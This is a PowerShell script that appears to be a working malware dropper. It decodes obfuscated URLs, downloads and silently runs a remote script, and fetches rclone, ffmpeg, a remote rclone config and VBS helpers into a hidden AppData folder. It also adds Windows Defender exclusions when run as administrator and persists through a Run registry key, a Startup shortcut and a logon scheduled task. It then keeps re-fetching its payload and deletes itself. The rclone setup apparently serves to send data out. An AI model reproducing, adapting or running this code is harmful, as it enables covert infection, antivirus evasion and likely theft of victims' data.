$ErrorActionPreference="Stop"
trap{continue}
$urls=@(
    'aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A',
    'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=='
)
function d($s){[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))}
$repo='https://'+(d($urls[0]) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
$gh='https://'+(d($urls[1]) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
$dest=Join-Path $env:APPDATA ('Microsoft\Windows\'+([guid]::NewGuid().Guid.Substring(0,8)))
$localVersion="1.0.0"
$mainScript="A.ps1"
$files=@("system_cache.ps1","rclone.exe","rclone.conf","ffmpeg.exe","setup.vbs","TaskService.vbs")
try{
    $remote=Invoke-WebRequest "$repo/version.txt" -UseBasicParsing -TimeoutSec 5
    if($remote.Content.Trim() -ne $localVersion){
        $tmp=Join-Path $env:TEMP $mainScript
        Invoke-WebRequest "$repo/$mainScript" -OutFile $tmp -TimeoutSec 10
        $encoded=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""))
        Start-Process -FilePath powershell -ArgumentList "-EncodedCommand $encoded" -WindowStyle Hidden
        exit
    }
}catch{}
if(-not(Test-Path $dest)){New-Item -ItemType Directory -Path $dest -Force|Out-Null}
try{attrib +h $dest}catch{}
foreach($f in $files){
    $t=Join-Path $dest $f
    if(-not(Test-Path $t)){
        try{
            if($f -eq "ffmpeg.exe" -or $f -eq "rclone.exe"){
                Invoke-WebRequest "$gh/$f" -OutFile $t -TimeoutSec 20
            }else{
                Invoke-WebRequest "$repo/$f" -OutFile $t -UseBasicParsing -TimeoutSec 10
            }
            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
        }catch{}
    }
}

function Update-RcloneConf {
    $remoteConfUrl = "$repo/rclone.conf"
    $localConf = Join-Path $dest "rclone.conf"
    try {
        $remoteInfo = Invoke-WebRequest -Uri $remoteConfUrl -UseBasicParsing -Method Head -ErrorAction Stop
        $remoteDate = $remoteInfo.Headers["Last-Modified"]
        $localDate = if (Test-Path $localConf) { (Get-Item $localConf).LastWriteTimeUtc } else { [datetime]::MinValue }
        if ($remoteDate) {
            $remoteDate = [datetime]::Parse($remoteDate).ToUniversalTime()
            if ($remoteDate -gt $localDate) {
                Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
            }
        } elseif (!(Test-Path $localConf)) {
            Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
        }
    } catch {}
}

function Wait-ForFiles {
    param([string[]]$files, [int]$timeoutSec = 120)
    $start = Get-Date
    while ($true) {
        $missing = $files | Where-Object { -not (Test-Path $_) }
        if ($missing.Count -eq 0) { break }
        if ((Get-Date) - $start -gt (New-TimeSpan -Seconds $timeoutSec)) {
            throw "Timeout waiting for files: $($missing -join ', ')"
        }
        Start-Sleep -Seconds 2
    }
}

Update-RcloneConf

Wait-ForFiles @(
    (Join-Path $dest "ffmpeg.exe"),
    (Join-Path $dest "rclone.exe"),
    (Join-Path $dest "rclone.conf")
)

$scps1 = Join-Path $dest "system_cache.ps1"
if (Test-Path $scps1) {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File "$scps1""
}
function Test-Admin{
    $id=[Security.Principal.WindowsIdentity]::GetCurrent()
    $p=New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if(Test-Admin){
    try{
        Set-MpPreference -ExclusionPath $dest
        Set-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
        Set-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
        Set-MpPreference -ExclusionProcess "$dest\rclone.exe"
    }catch{}
}
try{
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "`"$dest\system_cache.ps1`""
    $sh=New-Object -ComObject WScript.Shell
    $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\cache.lnk"
    $sc=$sh.CreateShortcut($lnk)
    $sc.TargetPath="powershell.exe"
    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
    $sc.WorkingDirectory=$dest
    $sc.Save()
    $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
    $trigger=New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "SysCacheUpd" -Action $action -Trigger $trigger -Force
}catch{}
Start-Job{
    $f="$dest\$mainScript"
    $src="$repo/$mainScript"
    while($true){
        if(-not(Test-Path $f)){
            try{Invoke-WebRequest $src -OutFile $f -UseBasicParsing}catch{}
        }
        Start-Sleep -Seconds 300
    }
}|Out-Null
$me=$MyInvocation.MyCommand.Path
$bat="$env:TEMP\delme.bat"
Set-Content -Path $bat -Value "@echo off`r`n:loop`r`ndel `"$me`"`r`nif exist `"$me`" goto loop`r`ndel %0" -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath $bat